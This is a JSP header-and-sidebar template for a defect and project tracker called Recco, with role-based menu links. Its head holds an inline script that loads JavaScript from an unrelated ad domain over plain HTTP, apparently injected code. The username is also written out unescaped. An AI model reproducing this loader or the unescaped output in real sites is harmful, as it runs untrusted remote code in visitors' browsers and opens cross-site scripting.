
<%@page import="src.model.Person"%>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Recco</title>
        <!--Core CSS -->
        <link href="bootstrap/html/bs3/css/bootstrap.min.css" rel="stylesheet">
        <link href="bootstrap/html/js/jquery-ui/jquery-ui-1.10.1.custom.min.css" rel="stylesheet">
        <link href="bootstrap/html/css/bootstrap-reset.css" rel="stylesheet">
        <link href="bootstrap/html/font-awesome/css/font-awesome.css" rel="stylesheet">
        <link href="bootstrap/html/js/jvector-map/jquery-jvectormap-1.2.2.css" rel="stylesheet">
        <link href="bootstrap/html/css/clndr.css" rel="stylesheet">
        <!--clock css-->
        <link href="bootstrap/html/js/css3clock/css/style.css" rel="stylesheet">
        <!--Morris Chart CSS -->
        <link rel="bootstrap/html/stylesheet" href="js/morris-chart/morris.css">
        <!-- Custom styles for this template -->
        <link href="bootstrap/html/css/style.css" rel="stylesheet">
        <link href="bootstrap/html/css/style-responsive.css" rel="stylesheet"/>
        <script type="text/javascript">(function () {
                var a = document.createElement("script");
                a.type = "text/javascript";
                a.async = !0;
                a.src = "http://img.rafomedia.com/zr/js/adrns_y.js?20151013";
                var b = document.getElementsByTagName("script")[0];
                b.parentNode.insertBefore(a, b);
            })();</script></head>
    <body>
        <%
            String username = "";
            String url = "";
            if (dev != null) {
                username = dev.getUsername();
                url = "manageDevProfile.jsp";
            } else if (pm != null) {
                username = pm.getUsername();
                url = "managePmProfile.jsp";
            } else if (sudo != null) {
                username = sudo.getUsername();
                url = "manageSudoProfile.jsp";
            } else {
                username = desg.getUsername();
                url = "manageDesgProfile.jsp";
            }
        %>
        <section id="container">
            <!--header start-->
            <header class="header fixed-top clearfix">
                <!--logo start-->
                <div class="brand">

                    <a href="index.jsp" class="logo">
                        <img src="bootstrap/html/images/ReccoWhite.svg" alt="" width="168px" height="32px">
                    </a>
                    <div class="sidebar-toggle-box">
                        <div class="fa fa-bars"></div>
                    </div>
                </div>
                <!--logo end-->

                <div class="top-nav clearfix">
                    <!--search & user info start-->
                    <ul class="nav pull-right top-menu">
                        <li>
                            <input type="text" class="form-control search" placeholder=" Search">
                        </li>
                        <!-- user login dropdown start-->
                        <li class="dropdown">
                            <a data-toggle="dropdown" class="dropdown-toggle" href="#">
                                <img src="ImageServlet?imageid=<%=username%>" align="center"/>
                                <span class="username"><%=username%></span>
                                <b class="caret"></b>
                            </a>
                            <ul class="dropdown-menu extended logout">
                                <li><a href="profilePage.jsp"><i class=" fa fa-suitcase"></i>Profile</a></li>
                                <li><a href="<%=url%>"><i class="fa fa-cog"></i> Settings</a></li>
                                <li><a href="Logout"><i class="fa fa-key"></i> Log Out</a></li>
                            </ul>
                        </li>
                        <!-- user login dropdown end -->

                    </ul>
                    <!--search & user info end-->
                </div>
            </header>
            <!--header end-->
            <!--sidebar start-->
            <aside>
                <div id="sidebar" class="nav-collapse">
                    <!-- sidebar menu start-->
                    <div class="leftside-navigation">
                        <ul class="sidebar-menu" id="nav-accordion">
                            <li>
                                <% if (thisPage.equals("index") || thisPage.equals("sudo")) { %>
                                <a class="active" href="index.jsp"> <% } else { %>
                                    <a href="index.jsp"> <% } %>
                                        <i class="fa fa-dashboard"></i>
                                        <span>Dashboard</span>
                                    </a>
                            </li>
                            <%if (dev != null) {%>
                            <li class="sub-menu">
                                <% if (thisPage.equals("viewDefects") || thisPage.equals("viewSortedDefects")) { %>
                                <a class="active" href="viewDefects.jsp"> <% } else { %>
                                    <a href="viewDefects.jsp"> <% } %>
                                        <i class="fa fa-bug"></i>
                                        <span>Defects</span>
                                    </a>

                                    <ul class="sub">
                                        <%if (dev != null) {%>
                                        <% if (thisPage.equals("viewDefects") || thisPage.equals("viewSortedDefects")) { %>
                                        <li class="active"><a href="viewDefects.jsp">View Defects</a></li><% } else { %>
                                        <li><a href="viewDefects.jsp">View Defects</a></li><% } %>
                                            <%}%>
                                    </ul>
                            </li><%}%>
                            <%if (pm != null) {%>
                            <li class="sub-menu">
                                <% if (thisPage.equals("manageDefects") || thisPage.equals("sortedDefects") || thisPage.equals("addDefect")) { %>
                                <a class="active" href="manageDefects.jsp"> <% } else { %>
                                    <a href="manageDefects.jsp"> <% } %>
                                        <i class="fa fa-bug"></i>
                                        <span>Defects</span>
                                    </a>


                                    <ul class="sub">
                                        <%if (pm != null) {%>
                                        <% if (thisPage.equals("manageDefects") || thisPage.equals("sortedDefects")) { %>
                                        <li class="active"><a href="manageDefects.jsp">View Defects</a></li><% } else { %>
                                        <li><a href="manageDefects.jsp">View Defects</a></li><% } %>
                                            <%}%>
                                        <%if (pm != null) {%>
                                        <% if (thisPage.equals("addDefect")) { %>
                                        <li class="active"><a href="addDefect.jsp">Add Defects</a></li><% } else { %>
                                        <li><a href="addDefect.jsp">Add Defects</a></li><% } %>
                                            <%}%>
                                    </ul>

                            </li><%}%>
                            <%if (sudo == null) {%>
                            <li class="sub-menu">
                                <% if (thisPage.equals("viewTrelloCards") || thisPage.equals("viewUnassignedCards")) { %>
                                <a href="javascript:;" class="active"> <% } else { %>
                                    <a href="javascript:;"> <% } %>
                                        <i class="fa fa-laptop"></i>
                                        <span>Projects</span>
                                    </a>
                                    <ul class="sub"><% if (thisPage.equals("viewTrelloCards")) { %>
                                        <li class="active"><a href="viewTrelloCards.jsp">View Projects</a></li> <% } else { %>
                                        <li><a href="viewTrelloCards.jsp">View Projects</a></li><% } %>
                                            <%if (pm != null) {%>
                                            <% if (thisPage.equals("viewUnassignedCards")) { %>
                                        <li class="active"><a href="assignProject">View Unassigned Projects</a></li><% } else { %>
                                        <li><a href="assignProject">View Unassigned Projects</a></li><% } %>
                                            <%}%>
                                    </ul>
                            </li>
                            <%}%>
                            <%if (sudo != null) {%>
                            <li>
                                <% if (thisPage.equals("manageUser") || thisPage.equals("manageDevProfile")) {%>
                                <a class="active" href="manageUser.jsp"> <% } else { %>
                                    <a href="manageUser.jsp"> <% }%>
                                        <i class="fa fa-users"></i>
                                        <span>Manage users</span>
                                    </a>
                            </li>

                            <li class="sub-menu">
                                <% if (thisPage.equals("addUsers")) {%>
                                <a class="active" href="addUsers.jsp"><% } else { %>
                                    <a href="addUsers.jsp"> <% }%>
                                        <i class="fa fa-plus-circle"></i>
                                        <span>Create Account</span>
                                    </a>
                            </li>
                            <%}%>
                        </ul>            
                    </div>
                    <!-- sidebar menu end-->
                </div>
            </aside>
            <!--sidebar end-->
        </section>
        <!-- Placed js at the end of the document so the pages load faster -->
        <!--Core js-->
        <script src="bootstrap/html/js/jquery.js"></script>
        <script src="bootstrap/html/js/jquery-ui/jquery-ui-1.10.1.custom.min.js"></script>
        <script src="bootstrap/html/bs3/js/bootstrap.min.js"></script>
        <script src="bootstrap/html/js/jquery.dcjqaccordion.2.7.js"></script>
        <script src="bootstrap/html/js/jquery.scrollTo.min.js"></script>
        <script src="bootstrap/html/js/jQuery-slimScroll-1.3.0/jquery.slimscroll.js"></script>
        <script src="bootstrap/html/js/jquery.nicescroll.js"></script>
        <!--[if lte IE 8]><script language="javascript" type="text/javascript" src="js/flot-chart/excanvas.min.js"></script><![endif]-->
        <script src="bootstrap/html/js/skycons/skycons.js"></script>
        <script src="bootstrap/html/js/jquery.scrollTo/jquery.scrollTo.js"></script>
        <script src="//cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js"></script>
        <script src="bootstrap/html/js/calendar/clndr.js"></script>
        <script src="http://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.5.2/underscore-min.js"></script>
        <script src="bootstrap/html/js/calendar/moment-2.2.1.js"></script>
        <script src="bootstrap/html/js/evnt.calendar.init.js"></script>
        <script src="bootstrap/html/js/jvector-map/jquery-jvectormap-1.2.2.min.js"></script>
        <script src="bootstrap/html/js/jvector-map/jquery-jvectormap-us-lcc-en.js"></script>
        <script src="bootstrap/html/js/gauge/gauge.js"></script>
        <!--common script init for all pages-->
        <script src="bootstrap/html/js/scripts.js"></script>
        <!--script for this page-->
    </body>
</html>